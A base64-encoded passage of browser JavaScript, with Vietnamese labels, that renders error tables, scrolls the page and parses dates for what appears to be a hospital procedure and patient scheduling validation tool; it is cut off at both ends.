ZXR1cm47DQogICAgfQ0KDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQovLy8vLy8vL0LhuqNuZyBs4buNYy8vLy8vLy8vLy8vDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGlmIChlcnJvci5kZXRhaWxzKSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnBhdGllbnROYW1lIHx8ICdLaMO0bmcgY8OzJ30gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50QWdlIHx8ICcwMCd9PC9mb250Pl08YnIvPiAke2Vycm9yLmRldGFpbHMucGF0aWVudElkIHx8ICcwMDAwMDAnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQoJCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3IuZGV0YWlscy5zdGFydFRpbWUgPyBgJHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZX0gLSAke2Vycm9yLmRldGFpbHMuZW5kVGltZX1gIDogJ0tow7RuZyBjw7MnDQogICAgICAgICAgICAgICAgfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gKFThu5FpIHRoaeG7g3U6ICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZH0gcGjDunQpYCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSIgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gJHtlcnJvci5yb3cgPyAnKETDsm5nICcgKyBlcnJvci5yb3cgKyAnKScgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQoNCg0KICAgICAgICBmdW5jdGlvbiBsb2dFcnJvcihtZXNzYWdlLCByb3cgPSBudWxsLCBkZXRhaWxzID0gbnVsbCkgew0KICAgICAgICAgICAgZXJyb3JMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgbWVzc2FnZSwNCiAgICAgICAgICAgICAgICByb3csDQogICAgICAgICAgICAgICAgZGV0YWlscywNCiAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9Mb2NhbGVUaW1lU3RyaW5nKCksDQogICAgICAgICAgICAgICAgdXNlcjogY3VycmVudFVzZXINCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQoNCmZ1bmN0aW9uIGRpc3BsYXlFcnJvcnMoKSB7DQogICAgY29uc3QgZXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsNCiAgICANCiAgICBpZiAoZXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgDQogICAgICAgIC8vIE7hur91IGtow7RuZyBjw7MgbOG7l2ksIGN14buZbiB4deG7kW5nIHBo4bqnbiBL4bq/dCBRdeG6oyBLaeG7g20gVHJhDQogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgcmVzdWx0U2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJyk7DQogICAgICAgICAgICBpZiAocmVzdWx0U2VjdGlvbiAmJiByZXN1bHRTZWN0aW9uLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJykgew0KICAgICAgICAgICAgICAgIHNtb290aFNjcm9sbFRvKHJlc3VsdFNlY3Rpb24sIC00MCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0sIDMwMCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sgdOG7q25nIGzhu5dpDQogICAgZXJyb3JMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGlmIChlcnJvci5kZXRhaWxzKSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnBhdGllbnROYW1lIHx8ICdLaMO0bmcgY8OzJ30gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50QWdlIHx8ICcwMCd9PC9mb250Pl08YnIvPiAke2Vycm9yLmRldGFpbHMucGF0aWVudElkIHx8ICcwMDAwMDAnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsyd9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gICAoVOG7kWkgdGhp4buDdTogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI2IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIEN14buZbiB4deG7kW5nIHBo4bqnbiBs4buXaSBu4bq/dSBjw7MNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgY29uc3QgZXJyb3JTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpOw0KICAgICAgICBpZiAoZXJyb3JTZWN0aW9uKSB7DQogICAgICAgICAgICBzbW9vdGhTY3JvbGxUbyhlcnJvclNlY3Rpb24sIC0xMzApOw0KICAgICAgICB9DQogICAgfSwgMzAwKTsNCn0NCg0KLy8gSMOgbSBjdeG7mW4gbcaw4bujdCB04buVbmcgcXXDoXQNCmZ1bmN0aW9uIHNtb290aFNjcm9sbFRvKGVsZW1lbnQsIG9mZnNldCA9IDApIHsNCiAgICBlbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2hpZ2hsaWdodC1lcnJvci1zZWN0aW9uJyk7DQogICAgDQogICAgY29uc3QgZWxlbWVudFBvc2l0aW9uID0gZWxlbWVudC5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKS50b3A7DQogICAgY29uc3Qgb2Zmc2V0UG9zaXRpb24gPSBlbGVtZW50UG9zaXRpb24gKyB3aW5kb3cucGFnZVlPZmZzZXQgLSBvZmZzZXQ7DQogICAgDQogICAgY29uc3QgZHVyYXRpb24gPSAxNTAwOw0KICAgIGNvbnN0IHN0YXJ0ID0gd2luZG93LnBhZ2VZT2Zmc2V0Ow0KICAgIGNvbnN0IHN0YXJ0VGltZSA9IHBlcmZvcm1hbmNlLm5vdygpOw0KICAgIA0KICAgIGZ1bmN0aW9uIHNjcm9sbFN0ZXAodGltZXN0YW1wKSB7DQogICAgICAgIGNvbnN0IGVsYXBzZWQgPSB0aW1lc3RhbXAgLSBzdGFydFRpbWU7DQogICAgICAgIGNvbnN0IHByb2dyZXNzID0gTWF0aC5taW4oZWxhcHNlZCAvIGR1cmF0aW9uLCAxKTsNCiAgICAgICAgY29uc3QgZWFzaW5nID0gZWFzZUluT3V0Q3ViaWMocHJvZ3Jlc3MpOw0KICAgICAgICB3aW5kb3cuc2Nyb2xsVG8oMCwgc3RhcnQgKyAob2Zmc2V0UG9zaXRpb24gLSBzdGFydCkgKiBlYXNpbmcpOw0KICAgICAgICANCiAgICAgICAgaWYgKHByb2dyZXNzIDwgMSkgew0KICAgICAgICAgICAgd2luZG93LnJlcXVlc3RBbmltYXRpb25GcmFtZShzY3JvbGxTdGVwKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICBmdW5jdGlvbiBlYXNlSW5PdXRDdWJpYyh0KSB7DQogICAgICAgIHJldHVybiB0IDwgMC41ID8gNCAqIHQgKiB0ICogdCA6IDEgLSBNYXRoLnBvdygtMiAqIHQgKyAyLCAzKSAvIDI7DQogICAgfQ0KICAgIA0KICAgIHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoc2Nyb2xsU3RlcCk7DQogICAgDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGVsZW1lbnQuY2xhc3NMaXN0LnJlbW92ZSgnaGlnaGxpZ2h0LWVycm9yLXNlY3Rpb24nKTsNCiAgICB9LCAyMDAwKTsNCn0NCg0KDQogLy8gPT09PT09IELhuq5UIFPhu7AgS0nhu4ZOIENIRUNLQk9YICJDaOG7iSBoaeG7g24gdGjhu4sgbmfDoHkgc+G6r2MgdGh14buRYyBs4buXaSIgPT09PT09DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0hlcmJFcnJvckRheXNDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBzaG93T25seUVycm9yRGF5cyA9IHRoaXMuY2hlY2tlZDsNCg0KICAgIC8vIDEuIEzhuqV5IHRvw6BuIGLhu5kgbmfDoHkgdOG7qyBhbGxQcm9jZWR1cmVzDQogICAgY29uc3QgYWxsRGF0ZXMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXTsNCg0KICAgIC8vIDIuIE7hur91IGLhuq10IGNoZWNrYm94IC0+IGNo4buJIGdp4buvIG5nw6B5IGPDsyBz4bqvYyB0aHXhu5FjIGzhu5dpDQogICAgbGV0IGRhdGVzVG9TaG93ID0gYWxsRGF0ZXM7DQogICAgaWYgKHNob3dPbmx5RXJyb3JEYXlzKSB7DQogICAgICAgIGNvbnN0IGhlcmJEYXRlcyA9IG5ldyBTZXQoKHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXSkubWFwKGggPT4gaC5kYXRlKSk7DQogICAgICAgIGRhdGVzVG9TaG93ID0gYWxsRGF0ZXMuZmlsdGVyKGQgPT4gaGVyYkRhdGVzLmhhcyhkKSk7DQogICAgfQ0KDQogICAgLy8gMy4gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIEdp4budIHRy4buRbmcgKGZpbHRlckRhdGUpDQogICAgY29uc3QgZmlsdGVyRGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk7DQogICAgaWYgKGZpbHRlckRhdGVTZWxlY3QpIHsNCiAgICAgICAgZmlsdGVyRGF0ZVNlbGVjdC5pbm5lckhUTUwgPSBgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+YCArDQogICAgICAgICAgICBkYXRlc1RvU2hvdy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIH0NCg0KICAgIC8vIDQuIEPhuq1wIG5o4bqtdCBkcm9wZG93biBT4bqvYyB0aHXhu5FjIHRoYW5nIChoZXJiRGF0ZUZpbHRlcikNCiAgICBjb25zdCBoZXJiRGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGlmIChoZXJiRGF0ZVNlbGVjdCkgew0KICAgICAgICBoZXJiRGF0ZVNlbGVjdC5pbm5lckhUTUwgPSBgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+YCArDQogICAgICAgICAgICBkYXRlc1RvU2hvdy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIH0NCn0pOw0KDQoNCiAgICAgICAgZnVuY3Rpb24gcGFyc2VEYXRlVGltZShkYXRldGltZVN0ciwgcm93SW5kZXgpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgaWYgKCFkYXRldGltZVN0cikgew0KICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIGRhdGV0aW1lU3RyID09PSAnbnVtYmVyJykgew0KICAgICAgICAgICAgICAgICAgICBjb25zdCBleGNlbERhdGUgPSBuZXcgRGF0ZShNYXRoLnJvdW5kKChkYXRldGltZVN0ciAtIDI1NTY5KSAqIDg2NDAwICogMTAwMCkpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXkgPSBleGNlbERhdGUuZ2V0RGF0ZSgpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtb250aCA9IGV4Y2VsRGF0ZS5nZXRNb250aCgpICsgMTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgeWVhciA9IGV4Y2VsRGF0ZS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBob3VycyA9IGV4Y2VsRGF0ZS5nZXRIb3VycygpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtaW51dGVzID0gZXhjZWxEYXRlLmdldE1pbnV0ZXMoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2Vjb25kcyA9IGV4Y2VsRGF0ZS5nZXRTZWNvbmRzKCk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZU9iajogZXhjZWxEYXRlLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZUtleTogYCR7ZGF5fS8ke21vbnRofS8ke3llYXJ9YCwNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXM6IGhvdXJzICogNjAgKyBtaW51dGVzLA0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vjb25kczogaG91cnMgKiAzNjAwICsgbWludXRlcyAqIDYwICsgc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlUaW1lOiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7c2Vjb25kcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YA0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRldGltZVN0ciA9PT0gJ3N0cmluZycpIHsNCiAgICAgICAgICAgICAgICAgICAgbGV0IGRhdGVQYXJ0LCB0aW1lUGFydCA9ICcwMDowMDowMCc7DQogICAgICAgICAgICAgICAgICAgIGlmIChkYXRldGltZVN0ci5pbmNsdWRlcygnICcpKSBbZGF0ZVBhcnQsIHRpbWVQYXJ0XSA9IGRhdGV0aW1lU3RyLnNwbGl0KCcgJyk7DQogICAgICAgICAgICAgICAgICAgIGVsc2UgZGF0ZVBhcnQgPSBkYXRldGltZVN0cjsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxldCBkYXksIG1vbnRoLCB5ZWFyOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0ZVBhcnQuaW5jbHVkZXMoJy8nKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGFydHMgPSBkYXRlUGFydC5zcGxpdCgnLycpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMykgW2RheSwgbW9udGgsIHllYXJdID0gcGFydHMubWFwKE51bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChwYXJ0cy5sZW5ndGggPT09IDIpIFtkYXksIG1vbnRoXSA9IHBhcnRzLm1hcChOdW1iZXIpLCB5ZWFyID0gbmV3IERhdGUoKS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGRhdGVQYXJ0LmluY2x1ZGVzKCctJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gZGF0ZVBhcnQuc3BsaXQoJy0nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIFt5ZWFyLCBtb250aCwgZGF5XSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocGFydHMubGVuZ3RoID09PSAyKSBbbW9udGgsIGRheV0gPSBwYXJ0cy5tYXAoTnVtYmVyKSwgeWVhciA9IG5ldyBEYXRlKCkuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHRocm93IG5ldyBFcnJvcignxJDhu4tuaCBk4bqhbmcgbmfDoHkga2jDtG5nIMSRxrDhu6NjIGjhu5cgdHLhu6MnKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChpc05hTihkYXkpIHx8IGlzTmFOKG1vbnRoKSB8fCBpc05hTih5ZWFyKSB8fCBkYXkgPCAxIHx8IGRheSA+IDMxIHx8IG1vbnRoIDwgMSB8fCBtb250aCA+IDEyKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0dpw6EgdHLhu4sgbmfDoHkga2jDtG5nIGjhu6NwIGzhu4cnKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbGV0IGhvdXJzID0gMCwgbWludXRlcyA9IDAsIHNlY29uZHMgPSAwOw0KICAgICAgICAgICAgICAgICAgICBpZiAodGltZVBhcnQuaW5jbHVkZXMoJzonKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZVBhcnRzID0gdGltZVBhcnQuc3BsaXQoJzonKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzID0gcGFyc2VJbnQodGltZVBhcnRzWzBdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgbWludXRlcyA9IHBhcnNlSW50KHRpbWVQYXJ0c1sxXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHMgPSBwYXJzZUludCh0aW1lUGFydHNbMl0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc05hTihob3VycykgfHwgaXNOYU4obWludXRlcykgfHwgaXNOYU4oc2Vjb25kcykgfHwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaG91cnMgPCAwIHx8IGhvdXJzID4gMjMgfHwgbWludXRlcyA8IDAgfHwgbWludXRlcyA+IDU5IHx8IHNlY29uZHMgPCAwIHx8IHNlY29uZHMgPiA1OSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKCdHacOhIHRy4buLIHRo4budaSBnaWFuIGtow7RuZyBo4bujcCBs4buHJywgcm93SW5kZXgsIHsgdGltZTogdGltZVBhcnQgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaG91cnMgPSAwOyBtaW51dGVzID0gMDsgc2Vjb25kcyA9IDA7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGVPYmogPSBuZXcgRGF0ZSh5ZWFyLCBtb250aCAtIDEsIGRheSwgaG91cnMsIG1pbnV0ZXMsIHNlY29uZHMpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oZGF0ZU9iai5nZXRUaW1lKCkpKSB0aHJvdyBuZXcgRXJyb3IoJ05nw6B5IGtow7RuZyBo4bujcCBs4buHJyk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBzZWNvbmRzSW5EYXkgPSBob3VycyAqIDM2MDAgKyBtaW51dGVzICogNjAgKyBzZWNvbmRzOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtaW51dGVzSW5EYXkgPSBob3VycyAqIDYwICsgbWludXRlczsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJldHVybiB7DQogICAgICAgICAgICAgICAgICAgICAgICBkYXRlT2JqLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZUtleTogYCR7ZGF5fS8ke21vbnRofS8ke3llYXJ9YCwNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXM6IG1pbnV0ZXNJbkRheSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHM6IHNlY29uZHNJbkRheSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlUaW1lOiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7c2Vjb25kcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YA0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ8SQ4buLbmggZOG6oW5nIHRo4budaSBnaWFuIGtow7RuZyDEkcaw4bujYyBo4buXIHRy4bujJyk7DQogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgICAgIGxv